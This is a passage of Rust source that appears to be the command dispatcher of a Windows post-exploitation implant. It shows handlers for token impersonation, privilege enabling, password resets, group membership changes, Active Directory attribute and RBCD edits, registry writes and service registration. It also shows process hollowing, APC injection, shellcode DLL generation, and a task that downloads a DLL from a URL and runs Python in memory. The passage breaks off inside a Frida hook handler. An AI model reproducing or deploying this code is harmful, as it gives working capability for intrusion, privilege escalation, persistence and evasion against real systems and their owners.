                                output.push_str(&attr.attr_name);
                                output.push_str(": ");
                                for val in &attr.str_val {
                                    output.push_str(val);
                                    output.push_str("; ");
                                }
                                output.push('\n');
                            }
                            output.push('\n');
                        }
                        last_result = result_ok(output.into_bytes());
                    }
                    Err(e) => {
                        #[cfg(feature = "debug")]
                        {
                            let msg = libs::utils::format_error(e);
                            if !msg.is_empty() {
                                libs::utils::write_output(&msg);
                            }
                        }
                        last_result = result_err(e, &[]);
                    }
                }
            }

            #[cfg(feature = "ad")]
            Task::SetAdAttrStr { dn, attr, value } => {
                let dn = resolve_arg(dn, &vars, &constants);
                let attr = resolve_arg(attr, &vars, &constants);
                let value = resolve_arg(value, &vars, &constants);

                let dn_str = core::str::from_utf8(&dn).unwrap_or("");
                let attr_str = core::str::from_utf8(&attr).unwrap_or("");
                let value_str = core::str::from_utf8(&value).unwrap_or("");

                match ldap::set_ad_attr_str("", dn_str, attr_str, value_str, None, None, None) {
                    Ok(()) => {
                        last_result = result_ok(alloc::vec![]);
                    }
                    Err(e) => {
                        #[cfg(feature = "debug")]
                        {
                            let msg = libs::utils::format_error(e);
                            if !msg.is_empty() {
                                libs::utils::write_output(&msg);
                            }
                        }
                        last_result = result_err(e, &[]);
                    }
                }
            }

            #[cfg(feature = "ad")]
            Task::SetAdAttrBin { dn, attr, value } => {
                let dn = resolve_arg(dn, &vars, &constants);
                let attr = resolve_arg(attr, &vars, &constants);
                let value = resolve_arg(value, &vars, &constants);

                let dn_str = core::str::from_utf8(&dn).unwrap_or("");
                let attr_str = core::str::from_utf8(&attr).unwrap_or("");

                let value_opt = if value.is_empty() { None } else { Some(value.as_slice()) };

                match ldap::set_ad_attr_bin("", dn_str, attr_str, value_opt, None, None, None) {
                    Ok(()) => {
                        last_result = result_ok(alloc::vec![]);
                    }
                    Err(e) => {
                        #[cfg(feature = "debug")]
                        {
                            let msg = libs::utils::format_error(e);
                            if !msg.is_empty() {
                                libs::utils::write_output(&msg);
                            }
                        }
                        last_result = result_err(e, &[]);
                    }
                }
            }

            #[cfg(feature = "network")]
            Task::PortScan { targets, ports } => {
                let targets = resolve_arg(targets, &vars, &constants);
                let ports = resolve_arg(ports, &vars, &constants);

                let targets_str = core::str::from_utf8(&targets).unwrap_or("");
                let ports_str = core::str::from_utf8(&ports).unwrap_or("");

                match enumerate::portscan(targets_str, ports_str) {
                    Ok(results) => {
                        let output = enumerate::serialize_portscan_results(&results);
                        last_result = result_ok(output);
                    }
                    Err(e) => {
                        last_result = result_err(e, &[]);
                    }
                }
            }

            #[cfg(feature = "user")]
            Task::SetUserPassword { server, username, password } => {
                let server = resolve_arg(server, &vars, &constants);
                let username = resolve_arg(username, &vars, &constants);
                let password = resolve_arg(password, &vars, &constants);

                let server_str = core::str::from_utf8(&server).unwrap_or("");
                let username_str = core::str::from_utf8(&username).unwrap_or("");
                let password_str = core::str::from_utf8(&password).unwrap_or("");

                let server_opt = if server_str.is_empty() { None } else { Some(server_str) };

                match net::set_user_password(server_opt, username_str, password_str) {
                    Ok(()) => last_result = result_ok(alloc::vec![]),
                    Err(e) => {
                        #[cfg(feature = "debug")]
                        {
                            let msg = libs::utils::format_error(e);
                            if !msg.is_empty() {
                                libs::utils::write_output(&msg);
                            }
                        }
                        last_result = result_err(e, &[]);
                    }
                }
            }

            #[cfg(feature = "user")]
            Task::AddUserToLocalGroup { server, group, username } => {
                let server = resolve_arg(server, &vars, &constants);
                let group = resolve_arg(group, &vars, &constants);
                let username = resolve_arg(username, &vars, &constants);

                let server_str = core::str::from_utf8(&server).unwrap_or("").trim_end_matches('\0');
                let group_str = core::str::from_utf8(&group).unwrap_or("").trim_end_matches('\0');
                let username_str = core::str::from_utf8(&username).unwrap_or("").trim_end_matches('\0');

                let server_opt = if server_str.is_empty() { None } else { Some(server_str) };

                match net::add_user_to_localgroup(server_opt, group_str, username_str) {
                    Ok(()) => last_result = result_ok(b"ok".to_vec()),
                    Err(e) => {
                        #[cfg(feature = "debug")]
                        {
                            let msg = libs::utils::format_error(e);
                            if !msg.is_empty() {
                                libs::utils::write_output(&msg);
                            }
                        }
                        last_result = result_err(e, &[]);
                    }
                }
            }

            #[cfg(feature = "user")]
            Task::RemoveUserFromLocalGroup { server, group, username } => {
                let server = resolve_arg(server, &vars, &constants);
                let group = resolve_arg(group, &vars, &constants);
                let username = resolve_arg(username, &vars, &constants);

                let server_str = core::str::from_utf8(&server).unwrap_or("").trim_end_matches('\0');
                let group_str = core::str::from_utf8(&group).unwrap_or("").trim_end_matches('\0');
                let username_str = core::str::from_utf8(&username).unwrap_or("").trim_end_matches('\0');

                let server_opt = if server_str.is_empty() { None } else { Some(server_str) };

                match net::remove_user_from_localgroup(server_opt, group_str, username_str) {
                    Ok(()) => last_result = result_ok(b"ok".to_vec()),
                    Err(e) => {
                        #[cfg(feature = "debug")]
                        {
                            let msg = libs::utils::format_error(e);
                            if !msg.is_empty() {
                                libs::utils::write_output(&msg);
                            }
                        }
                        last_result = result_err(e, &[]);
                    }
                }
            }

            #[cfg(feature = "user")]
            Task::GetUserSid { server, username } => {
                let server = resolve_arg(server, &vars, &constants);
                let username = resolve_arg(username, &vars, &constants);

                let server_str = core::str::from_utf8(&server).unwrap_or("");
                let username_str = core::str::from_utf8(&username).unwrap_or("");

                let server_opt = if server_str.is_empty() { None } else { Some(server_str) };

                match net::get_user_sid(server_opt, username_str) {
                    Ok(sid_str) => last_result = result_ok(sid_str.into_bytes()),
                    Err(e) => {
                        #[cfg(feature = "debug")]
                        {
                            let msg = libs::utils::format_error(e);
                            if !msg.is_empty() {
                                libs::utils::write_output(&msg);
                            }
                        }
                        last_result = result_err(e, &[]);
                    }
                }
            }

            #[cfg(feature = "user")]
            Task::AddUserToGroup { server, group, username } => {
                let server = resolve_arg(server, &vars, &constants);
                let group = resolve_arg(group, &vars, &constants);
                let username = resolve_arg(username, &vars, &constants);

                let server_str = core::str::from_utf8(&server).unwrap_or("");
                let group_str = core::str::from_utf8(&group).unwrap_or("");
                let username_str = core::str::from_utf8(&username).unwrap_or("");

                match net::add_user_to_group(server_str, group_str, username_str) {
                    Ok(()) => last_result = result_ok(alloc::vec![]),
                    Err(e) => {
                        #[cfg(feature = "debug")]
                        {
                            let msg = libs::utils::format_error(e);
                            if !msg.is_empty() {
                                libs::utils::write_output(&msg);
                            }
                        }
                        last_result = result_err(e, &[]);
                    }
                }
            }

            #[cfg(feature = "user")]
            Task::RemoveUserFromGroup { server, group, username } => {
                let server = resolve_arg(server, &vars, &constants);
                let group = resolve_arg(group, &vars, &constants);
                let username = resolve_arg(username, &vars, &constants);

                let server_str = core::str::from_utf8(&server).unwrap_or("");
                let group_str = core::str::from_utf8(&group).unwrap_or("");
                let username_str = core::str::from_utf8(&username).unwrap_or("");

                match net::remove_user_from_group(server_str, group_str, username_str) {
                    Ok(()) => last_result = result_ok(alloc::vec![]),
                    Err(e) => {
                        #[cfg(feature = "debug")]
                        {
                            let msg = libs::utils::format_error(e);
                            if !msg.is_empty() {
                                libs::utils::write_output(&msg);
                            }
                        }
                        last_result = result_err(e, &[]);
                    }
                }
            }

            #[cfg(feature = "ad")]
            Task::CreateRbcdAce { sid } => {
                let sid = resolve_arg(sid, &vars, &constants);

                match net::create_rbcd_ace(sid) {
                    Ok(ace) => last_result = result_ok(ace),
                    Err(e) => {
                        #[cfg(feature = "debug")]
                        {
                            let msg = libs::utils::format_error(e);
                            if !msg.is_empty() {
                                libs::utils::write_output(&msg);
                            }
                        }
                        last_result = result_err(e, &[]);
                    }
                }
            }
            #[cfg(feature = "registry")]
            Task::RegCreateKey { key } => {
                let key = resolve_arg(key, &vars, &constants);
                let key_str = String::from_utf8_lossy(&key);

                match reg::reg_create_key(&key_str) {
                    Ok(_) => last_result = result_ok(b"ok".to_vec()),
                    Err(e) => last_result = result_err(e, &[]),
                }
            }
            #[cfg(feature = "registry")]
            Task::RegDeleteKey { key } => {
                let key = resolve_arg(key, &vars, &constants);
                let key_str = String::from_utf8_lossy(&key);

                match reg::reg_delete_key(&key_str) {
                    Ok(_) => last_result = result_ok(b"ok".to_vec()),
                    Err(e) => last_result = result_err(e, &[]),
                }
            }
            #[cfg(feature = "registry")]
            Task::RegSetValue { key, value_name, value_type, value } => {
                let key = resolve_arg(key, &vars, &constants);
                let value_name = resolve_arg(value_name, &vars, &constants);
                let value_type = resolve_arg(value_type, &vars, &constants);
                let value = resolve_arg(value, &vars, &constants);

                let key_str = String::from_utf8_lossy(&key);
                let value_name_str = String::from_utf8_lossy(&value_name);
                let value_type_str = String::from_utf8_lossy(&value_type);

                match reg::reg_set_value(&key_str, &value_name_str, &value_type_str, &value) {
                    Ok(_) => last_result = result_ok(b"ok".to_vec()),
                    Err(e) => last_result = result_err(e, &[]),
                }
            }
            #[cfg(feature = "registry")]
            Task::RegQueryValue { key, value_name } => {
                let key = resolve_arg(key, &vars, &constants);
                let value_name = resolve_arg(value_name, &vars, &constants);

                let key_str = String::from_utf8_lossy(&key);
                let value_name_str = String::from_utf8_lossy(&value_name);

                match reg::reg_query_value(&key_str, &value_name_str) {
                    Ok(data) => last_result = result_ok(data),
                    Err(e) => last_result = result_err(e, &[]),
                }
            }
            #[cfg(feature = "priv")]
            Task::MakeToken { domain, username, password, logon_type } => {
                let domain = resolve_arg(domain, &vars, &constants);
                let username = resolve_arg(username, &vars, &constants);
                let password = resolve_arg(password, &vars, &constants);
                let logon_type_val = if let Some(lt) = logon_type {
                    let lt_data = resolve_arg(lt, &vars, &constants);
                    if lt_data.is_empty() { None } else { Some(lt_data[0] as u32) }
                } else {
                    None
                };

                let domain_str = String::from_utf8_lossy(&domain);
                let username_str = String::from_utf8_lossy(&username);
                let password_str = String::from_utf8_lossy(&password);

                match token::make_token(&domain_str, &username_str, &password_str, logon_type_val) {
                    Ok(_) => last_result = result_ok(b"ok".to_vec()),
                    Err(e) => {
                        #[cfg(feature = "debug")]
                        { let msg = libs::utils::format_error(e); if !msg.is_empty() { libs::utils::write_output(&msg); } }
                        last_result = result_err(e, &[]);
                    }
                }
            }
            #[cfg(feature = "priv")]
            Task::ImpersonateProcess { search } => {
                let search_expanded = resolve_arg(search, &vars, &constants);
                let search_str = String::from_utf8_lossy(&search_expanded);
                let search_str = search_str.trim_end_matches('\0');

                let procs = enumerate::list_procs();
                let mut found_pid: Option<u32> = None;

                for p in procs {
                    let mut proc_str = p.image.trim_end_matches('\0').to_owned();
                    if let Some(cmd) = &p.cmdline {
                        proc_str.push(' ');
                        proc_str.push_str(cmd);
                    }
                    if proc_str.contains(search_str) {
                        found_pid = Some(p.pid);
                        break;
                    }
                }

                match found_pid {
                    Some(pid) => match token::impersonate_process(pid) {
                        Ok(_) => last_result = result_ok(b"ok".to_vec()),
                        Err(e) => {
                            #[cfg(feature = "debug")]
                            { let msg = libs::utils::format_error(e); if !msg.is_empty() { libs::utils::write_output(&msg); } }
                            last_result = result_err(e, &[]);
                        }
                    },
                    None => last_result = result_err(0x02, b"process not found"),
                }
            }
            #[cfg(feature = "priv")]
            Task::EnablePrivilege { search, priv_name } => {
                let search_expanded = resolve_arg(search, &vars, &constants);
                let priv_name_expanded = resolve_arg(priv_name, &vars, &constants);
                let search_str = String::from_utf8_lossy(&search_expanded);
                let search_str = search_str.trim_end_matches('\0');
                let priv_name_str = String::from_utf8_lossy(&priv_name_expanded);

                if search_str.is_empty() {
                    // Enable on current process
                    match token::enable_process_privilege(&priv_name_str) {
                        Ok(_) => last_result = result_ok(b"ok".to_vec()),
                        Err(e) => {
                            #[cfg(feature = "debug")]
                            { let msg = libs::utils::format_error(e); if !msg.is_empty() { libs::utils::write_output(&msg); } }
                            last_result = result_err(e, &[]);
                        }
                    }
                } else {
                    // Find process by search string
                    let procs = enumerate::list_procs();
                    let mut found_pid: Option<u32> = None;

                    for p in procs {
                        let mut proc_str = p.image.trim_end_matches('\0').to_owned();
                        if let Some(cmd) = &p.cmdline {
                            proc_str.push(' ');
                            proc_str.push_str(cmd);
                        }
                        if proc_str.contains(search_str) {
                            found_pid = Some(p.pid);
                            break;
                        }
                    }

                    match found_pid {
                        Some(pid) => match token::enable_privilege_by_pid(pid, &priv_name_str) {
                            Ok(_) => last_result = result_ok(b"ok".to_vec()),
                            Err(e) => {
                                #[cfg(feature = "debug")]
                                { let msg = libs::utils::format_error(e); if !msg.is_empty() { libs::utils::write_output(&msg); } }
                                last_result = result_err(e, &[]);
                            }
                        },
                        None => last_result = result_err(0x02, b"process not found"),
                    }
                }
            }
            #[cfg(feature = "priv")]
            Task::ListProcessPrivs { search } => {
                let search_expanded = resolve_arg(search, &vars, &constants);
                let search_str = String::from_utf8_lossy(&search_expanded);
                let search_str = search_str.trim_end_matches('\0');

                let pid_opt = if search_str.is_empty() {
                    None
                } else {
                    let procs = enumerate::list_procs();
                    let mut found_pid: Option<u32> = None;
                    for p in procs {
                        let mut proc_str = p.image.trim_end_matches('\0').to_owned();
                        if let Some(cmd) = &p.cmdline {
                            proc_str.push(' ');
                            proc_str.push_str(cmd);
                        }
                        if proc_str.contains(search_str) {
                            found_pid = Some(p.pid);
                            break;
                        }
                    }
                    found_pid
                };

                if !search_str.is_empty() && pid_opt.is_none() {
                    last_result = result_err(0x02, b"process not found");
                } else {
                    match token::list_process_privs(pid_opt) {
                        Ok(privs) => {
                            let mut output: Vec<u8> = Vec::new();
                            for prv in privs {
                                output.extend_from_slice(prv.name.as_bytes());
                                if prv.enabled {
                                    output.extend_from_slice(b"\tenabled");
                                } else {
                                    output.extend_from_slice(b"\tdisabled");
                                }
                                output.push(b'\n');
                            }
                            last_result = result_ok(output);
                        }
                        Err(e) => {
                            #[cfg(feature = "debug")]
                            { let msg = libs::utils::format_error(e); if !msg.is_empty() { libs::utils::write_output(&msg); } }
                            last_result = result_err(e, &[]);
                        }
                    }
                }
            }
            #[cfg(feature = "priv")]
            Task::ListThreadPrivs => {
                match token::list_current_thread_privs() {
                    Ok(privs) => {
                        let mut output: Vec<u8> = Vec::new();
                        for prv in privs {
                            output.extend_from_slice(prv.name.as_bytes());
                            if prv.enabled {
                                output.extend_from_slice(b"\tenabled");
                            } else {
                                output.extend_from_slice(b"\tdisabled");
                            }
                            output.push(b'\n');
                        }
                        last_result = result_ok(output);
                    }
                    Err(e) => {
                        #[cfg(feature = "debug")]
                        { let msg = libs::utils::format_error(e); if !msg.is_empty() { libs::utils::write_output(&msg); } }
                        last_result = result_err(e, &[]);
                    }
                }
            }
            #[cfg(feature = "filesystem")]
            Task::DeleteFile { path } => {
                let path = resolve_arg(path, &vars, &constants);
                let path_str = String::from_utf8_lossy(&path);

                match fs::delete_file(&path_str) {
                    Ok(_) => last_result = result_ok(b"ok".to_vec()),
                    Err(e) => last_result = result_err(e, &[]),
                }
            }
            #[cfg(feature = "priv")]
            Task::RevertToSelf => {
                match token::revert_to_self() {
                    Ok(_) => last_result = result_ok(b"ok".to_vec()),
                    Err(e) => {
                        #[cfg(feature = "debug")]
                        { let msg = libs::utils::format_error(e); if !msg.is_empty() { libs::utils::write_output(&msg); } }
                        last_result = result_err(e, &[]);
                    }
                }
            }
            #[cfg(feature = "services")]
            Task::StartService { target, service_name } => {
                let target = resolve_arg(target, &vars, &constants);
                let service_name = resolve_arg(service_name, &vars, &constants);

                let target_str = String::from_utf8_lossy(&target);
                let service_name_str = String::from_utf8_lossy(&service_name);

                match exec::start_service(&target_str, &service_name_str) {
                    Ok(_) => last_result = result_ok(b"ok".to_vec()),
                    Err(e) => {
                        #[cfg(feature = "debug")]
                        {
                            let msg = libs::utils::format_error(e);
                            if !msg.is_empty() {
                                libs::utils::write_output(&msg);
                            }
                        }
                        last_result = result_err(e, &[]);
                    }
                }
            }
            #[cfg(feature = "services")]
            Task::DeleteService { target, service_name } => {
                let target = resolve_arg(target, &vars, &constants);
                let service_name = resolve_arg(service_name, &vars, &constants);

                let target_str = String::from_utf8_lossy(&target);
                let service_name_str = String::from_utf8_lossy(&service_name);

                match exec::delete_service(&target_str, &service_name_str) {
                    Ok(_) => last_result = result_ok(b"ok".to_vec()),
                    Err(e) => {
                        #[cfg(feature = "debug")]
                        {
                            let msg = libs::utils::format_error(e);
                            if !msg.is_empty() {
                                libs::utils::write_output(&msg);
                            }
                        }
                        last_result = result_err(e, &[]);
                    }
                }
            }
            #[cfg(feature = "execution")]
            Task::CreateThread { task, magic } => {
                let task_expanded = resolve_arg(task, &vars, &constants);
                let magic_expanded = resolve_arg(magic, &vars, &constants);

                // Parse task: 0xFF or empty = None (same task)
                let task_opt = if task_expanded.is_empty() || task_expanded[0] == 0xFF {
                    None
                } else {
                    Some(task_expanded[0])
                };

                // Parse magic: if provided, use it; else None (auto-detect)
                let magic_opt = if magic_expanded.len() >= 4 {
                    Some(u32::from_le_bytes([
                        magic_expanded[0],
                        magic_expanded[1],
                        magic_expanded[2],
                        magic_expanded[3],
                    ]))
                } else {
                    None
                };

                let handle = inject::migrate_thread(task_opt, magic_opt);
                if handle.is_null() {
                    last_result = result_err(0x01, b"create_thread failed");
                    #[cfg(feature = "debug")]
                    libs::utils::write_output(b"create_thread failed");
                } else {
                    last_result = result_ok(Vec::new());
                    #[cfg(feature = "debug")]
                    libs::utils::write_output(b"thread created");
                }
            }
            #[cfg(feature = "payload_gen")]
            Task::GenerateDll { task, export_name } => {
                let task_expanded = resolve_arg(task, &vars, &constants);
                let export_name_expanded = resolve_arg(export_name, &vars, &constants);

                let task_id = if task_expanded.is_empty() { 0 } else { task_expanded[0] };
                let export_str = core::str::from_utf8(&export_name_expanded).unwrap_or("Run");

                let shellcode = get_shellcode(Some(task_id), None);
                let dll = libs::utils::generate_dll(&shellcode, export_str);
                last_result = result_ok(dll);
            }

            #[cfg(feature = "execution")]
            Task::ShellExecute { path, verb, args } => {
                let path_expanded = resolve_arg(path, &vars, &constants);
                let verb_expanded = resolve_arg(verb, &vars, &constants);
                let args_expanded = resolve_arg(args, &vars, &constants);
                let path_str = core::str::from_utf8(&path_expanded).unwrap_or("");
                let verb_str = core::str::from_utf8(&verb_expanded).unwrap_or("");
                let args_str = core::str::from_utf8(&args_expanded).unwrap_or("");

                match shell::shell_execute(path_str, verb_str, args_str) {
                    Ok(_) => last_result = result_ok(Vec::from(b"OK".as_slice())),
                    Err(e) => {
                        #[cfg(feature = "debug")]
                        {
                            let msg = libs::utils::format_error(e);
                            if !msg.is_empty() {
                                libs::utils::write_output(&msg);
                            }
                        }
                        last_result = result_err(e, &[]);
                    }
                }
            }

            #[cfg(feature = "execution")]
            Task::ShellExtract { zip_path } => {
                let zip_expanded = resolve_arg(zip_path, &vars, &constants);
                let zip_str = core::str::from_utf8(&zip_expanded).unwrap_or("");

                match shell::shell_extract_zip(zip_str) {
                    Ok(dest_path) => last_result = result_ok(dest_path),
                    Err(e) => {
                        #[cfg(feature = "debug")]
                        {
                            let msg = libs::utils::format_error(e);
                            if !msg.is_empty() {
                                libs::utils::write_output(&msg);
                            }
                        }
                        last_result = result_err(e, &[]);
                    }
                }
            }

            #[cfg(feature = "execution")]
            Task::ShellExecuteExplorer { path, verb, args } => {
                let path_expanded = resolve_arg(path, &vars, &constants);
                let verb_expanded = resolve_arg(verb, &vars, &constants);
                let args_expanded = resolve_arg(args, &vars, &constants);
                let path_str = core::str::from_utf8(&path_expanded).unwrap_or("");
                let verb_str = core::str::from_utf8(&verb_expanded).unwrap_or("");
                let args_str = core::str::from_utf8(&args_expanded).unwrap_or("");

                match shell::shell_execute_explorer(path_str, verb_str, args_str) {
                    Ok(_) => last_result = result_ok(Vec::from(b"OK".as_slice())),
                    Err(e) => {
                        #[cfg(feature = "debug")]
                        {
                            let msg = libs::utils::format_error(e);
                            if !msg.is_empty() {
                                libs::utils::write_output(&msg);
                            }
                        }
                        last_result = result_err(e, &[]);
                    }
                }
            }

            #[cfg(feature = "payload_gen")]
            Task::LoadLibrary { path } => {
                let path_expanded = resolve_arg(path, &vars, &constants);
                let path_str = String::from_utf8_lossy(&path_expanded);
                let path_str = path_str.trim_end_matches('\0');

                // Convert to wide string
                let path_wide: Vec<u16> = path_str.encode_utf16().chain(Some(0)).collect();

                let handle = (get_instance().unwrap().k32.load_library_w)(path_wide.as_ptr());
                if handle.is_null() {
                    let e = (get_instance().unwrap().k32.get_last_error)();
                    #[cfg(feature = "debug")]
                    {
                        let msg = libs::utils::format_error(e);
                        if !msg.is_empty() {
                            libs::utils::write_output(&msg);
                        }
                    }
                    last_result = result_err(e, &[]);
                } else {
                    last_result = result_ok(Vec::from(b"OK".as_slice()));
                }
            }

            // 0x37 - PyExec: Load custom in-memory Python DLL and run script
            // Requires SCYTHE-style Python DLL with embedded stdlib
            #[cfg(all(feature = "python", feature = "network"))]
            Task::PyExec { url, script } => {
                use libs::winhttp::HttpClient;

                let url_expanded = resolve_arg(url, &vars, &constants);
                let url_str = String::from_utf8_lossy(&url_expanded);
                let url_str = url_str.trim_end_matches('\0');

                let script_expanded = resolve_arg(script, &vars, &constants);
                let script_str = String::from_utf8_lossy(&script_expanded);
                let script_str = script_str.trim_end_matches('\0');

                // Parse URL
                let secure = url_str.starts_with("https://");
                let mut port: u16 = if secure { 443 } else { 80 };
                let (mut host, path) = split_url(url_str);
                if let Some(idx) = host.find(':') {
                    if let Ok(p) = host[idx + 1..].parse::<u16>() {
                        port = p;
                    }
                    host = host[..idx].to_string();
                }

                // Check cache
                let dll_name = url_str.to_string();
                let mut dll_base: *mut c_void = null_mut();
                for alloc in &get_instance().unwrap().allocations {
                    if alloc.name == dll_name {
                        dll_base = alloc.base;
                        break;
                    }
                }

                // Download and load if not cached
                if dll_base.is_null() {
                    let client = match HttpClient::new() {
                        Ok(c) => c,
                        Err(e) => {
                            last_result = result_err(e, &[]);
                            idx = next_idx;
                            continue;
                        }
                    };
                    let dll_data = match client.send("GET", &host, port, &path, secure, None) {
                        Ok(d) => d,
                        Err(e) => {
                            last_result = result_err(e, &[]);
                            idx = next_idx;
                            continue;
                        }
                    };
                    dll_base = match inject::reflective_load_dll_named(&dll_name, &dll_data) {
                        Ok(b) => b,
                        Err(e) => {
                            last_result = result_err(e, &[]);
                            idx = next_idx;
                            continue;
                        }
                    };
                }

                // Function types
                type PyRunSimpleString = unsafe extern "C" fn(*const u8) -> i32;
                type PyIsInitialized = unsafe extern "C" fn() -> i32;
                type PySetPath = unsafe extern "C" fn(*const u16);
                type PySetPythonHome = unsafe extern "C" fn(*const u16);
                type PyInitializeEx = unsafe extern "C" fn(i32);

                // Get exports
                let py_run = inject::get_reflective_export(dll_base, b"PyRun_SimpleString\0");
                let py_is_init = inject::get_reflective_export(dll_base, b"Py_IsInitialized\0");
                let py_set_path = inject::get_reflective_export(dll_base, b"Py_SetPath\0");
                let py_set_home = inject::get_reflective_export(dll_base, b"Py_SetPythonHome\0");
                let py_init_ex = inject::get_reflective_export(dll_base, b"Py_InitializeEx\0");

                if py_run.is_none() || py_init_ex.is_none() {
                    last_result = result_err(0x80004005u32, b"missing python exports");
                    idx = next_idx;
                    continue;
                }

                let py_run_fn: PyRunSimpleString = core::mem::transmute(py_run.unwrap());

                // Check if already initialized
                let already_init = if let Some(ptr) = py_is_init {
                    let is_init: PyIsInitialized = core::mem::transmute(ptr);
                    is_init() != 0
                } else {
                    false
                };

                if !already_init {
                    // Initialize: SetPath("") + SetPythonHome("") + InitializeEx(0)
                    let empty_path: [u16; 1] = [0];

                    if let Some(ptr) = py_set_path {
                        let set_path: PySetPath = core::mem::transmute(ptr);
                        set_path(empty_path.as_ptr());
                    }
                    if let Some(ptr) = py_set_home {
                        let set_home: PySetPythonHome = core::mem::transmute(ptr);
                        set_home(empty_path.as_ptr());
                    }

                    let init_ex: PyInitializeEx = core::mem::transmute(py_init_ex.unwrap());
                    init_ex(0);

                    // Verify
                    if let Some(ptr) = py_is_init {
                        let is_init: PyIsInitialized = core::mem::transmute(ptr);
                        if is_init() == 0 {
                            last_result = result_err(0x80004005u32, b"python init failed");
                            idx = next_idx;
                            continue;
                        }
                    }

                    // Create "agent" module with our functions
                    python::create_agent_module(dll_base);
                }

                // Run script
                if !script_str.is_empty() {
                    let mut script_cstr = script_str.as_bytes().to_vec();
                    script_cstr.push(0);
                    let result = py_run_fn(script_cstr.as_ptr());
                    if result == 0 {
                        last_result = result_ok(b"ok".to_vec());
                    } else {
                        last_result = result_err(result as u32, b"script error");
                    }
                } else {
                    last_result = result_ok(b"python ready".to_vec());
                }
            }

            // 0x38 - Process Hollowing
            #[cfg(feature = "execution")]
            Task::Hollow { image, task_id, search } => {
                let image_expanded = resolve_arg(image, &vars, &constants);
                let image_str = String::from_utf8_lossy(&image_expanded);
                let image_str = image_str.trim_end_matches('\0');

                let task_byte = resolve_arg(task_id, &vars, &constants);
                let task_opt = if task_byte.is_empty() || task_byte[0] == 0xFF {
                    None
                } else {
                    Some(task_byte[0])
                };

                let ppid = if let Some(search_arg) = search {
                    let search_expanded = resolve_arg(search_arg, &vars, &constants);
                    if !search_expanded.is_empty() {
                        let search_str = String::from_utf8_lossy(&search_expanded);
                        let search_str = search_str.trim_end_matches('\0');
                        let search_lower = search_str.to_lowercase();
                        // Find process by search string
                        let mut pid = None;
                        for proc in enumerate::list_procs() {
                            let cmdline = proc.cmdline.unwrap_or_default();
                            if proc.image.to_lowercase().contains(&search_lower)
                               || cmdline.to_lowercase().contains(&search_lower) {
                                pid = Some(proc.pid);
                                break;
                            }
                        }
                        pid
                    } else {
                        None
                    }
                } else {
                    None
                };

                match inject::hollow(image_str, task_opt, None, ppid) {
                    Ok(_) => last_result = result_ok(b"ok".to_vec()),
                    Err(e) => {
                        #[cfg(feature = "debug")]
                        {
                            let msg = libs::utils::format_error(e);
                            if !msg.is_empty() {
                                libs::utils::write_output(&msg);
                            }
                        }
                        last_result = result_err(e, &[]);
                    }
                }
            }

            // 0x39 - APC Injection
            #[cfg(feature = "execution")]
            Task::MigrateApc { image, task_id, magic } => {
                let image_expanded = resolve_arg(image, &vars, &constants);
                let image_str = String::from_utf8_lossy(&image_expanded);
                let image_str = image_str.trim_end_matches('\0');

                let task_byte = resolve_arg(task_id, &vars, &constants);
                let task_opt = if task_byte.is_empty() || task_byte[0] == 0xFF {
                    None
                } else {
                    Some(task_byte[0])
                };

                let magic_opt = if let Some(magic_arg) = magic {
                    let magic_expanded = resolve_arg(magic_arg, &vars, &constants);
                    if magic_expanded.len() >= 4 {
                        Some(u32::from_le_bytes([
                            magic_expanded[0],
                            magic_expanded[1],
                            magic_expanded[2],
                            magic_expanded[3],
                        ]))
                    } else {
                        None
                    }
                } else {
                    None
                };

                match inject::apc_injection(image_str, task_opt, magic_opt) {
                    Ok(pid) => {
                        let msg = int_to_str(pid);
                        last_result = result_ok(msg.into_bytes());
                    }
                    Err(e) => {
                        #[cfg(feature = "debug")]
                        {
                            let msg = libs::utils::format_error(e);
                            if !msg.is_empty() {
                                libs::utils::write_output(&msg);
                            }
                        }
                        last_result = result_err(e, &[]);
                    }
                }
            }

            // 0x3A - Register as Windows service
            #[cfg(feature = "services")]
            Task::RegisterService { service_name } => {
                let name_expanded = resolve_arg(service_name, &vars, &constants);
                let name_str = String::from_utf8_lossy(&name_expanded);
                let name_str = name_str.trim_end_matches('\0');

                match exec::register_service(name_str) {
                    Ok(_) => last_result = result_ok(b"service registered".to_vec()),
                    Err(e) => {
                        #[cfg(feature = "debug")]
                        {
                            let msg = libs::utils::format_error(e);
                            if !msg.is_empty() {
                                libs::utils::write_output(&msg);
                            }
                        }
                        last_result = result_err(e, &[]);
                    }
                }
            }

            // 0x3B - Exit process
            Task::ExitProcess { exit_code } => {
                let code_expanded = resolve_arg(exit_code, &vars, &constants);
                let code: u32 = if code_expanded.is_empty() {
                    0
                } else {
                    let code_str = String::from_utf8_lossy(&code_expanded);
                    code_str.trim_end_matches('\0').parse().unwrap_or(0)
                };
                unsafe {
                    (get_instance().unwrap().k32.exit_process)(code);
                }
            }

            // 0x3C - Process Hollowing with APC
            #[cfg(feature = "execution")]
            Task::HollowApc { image, task_id, search } => {
                let image_expanded = resolve_arg(image, &vars, &constants);
                let image_str = String::from_utf8_lossy(&image_expanded);
                let image_str = image_str.trim_end_matches('\0');

                let task_byte = resolve_arg(task_id, &vars, &constants);
                let task_opt = if task_byte.is_empty() || task_byte[0] == 0xFF {
                    None
                } else {
                    Some(task_byte[0])
                };

                let ppid = if let Some(search_arg) = search {
                    let search_expanded = resolve_arg(search_arg, &vars, &constants);
                    if !search_expanded.is_empty() {
                        let search_str = String::from_utf8_lossy(&search_expanded);
                        let search_str = search_str.trim_end_matches('\0');
                        let search_lower = search_str.to_lowercase();
                        // Find process by search string
                        let mut pid = None;
                        for proc in enumerate::list_procs() {
                            let cmdline = proc.cmdline.unwrap_or_default();
                            if proc.image.to_lowercase().contains(&search_lower)
                               || cmdline.to_lowercase().contains(&search_lower) {
                                pid = Some(proc.pid);
                                break;
                            }
                        }
                        pid
                    } else {
                        None
                    }
                } else {
                    None
                };

                match inject::hollow_apc(image_str, task_opt, None, ppid) {
                    Ok(_) => last_result = result_ok(b"ok".to_vec()),
                    Err(e) => {
                        #[cfg(feature = "debug")]
                        {
                            let msg = libs::utils::format_error(e);
                            if !msg.is_empty() {
                                libs::utils::write_output(&msg);
                            }
                        }
                        last_result = result_err(e, &[]);
                    }
                }
            }


            // 0x3F - Frida Hook: Load Frida DLL and install JavaScript hook
            #[cfg(feature = "frida")]
            Task::FridaHook { url, script, name, callback_host, callback_port, batch_size, flush_interval } => {
                use libs::winhttp::HttpClient;
                use libs::frida;

                let url_expanded = resolve_arg(url, &vars, &constants);
                let url_str = String::from_utf8_lossy(&url_expanded);
                let url_str = url_str.trim_end_matches('\0');

                let script_expanded = resolve_arg(script, &vars, &constants);
                let script_str = String::from_utf8_lossy(&script_expanded);
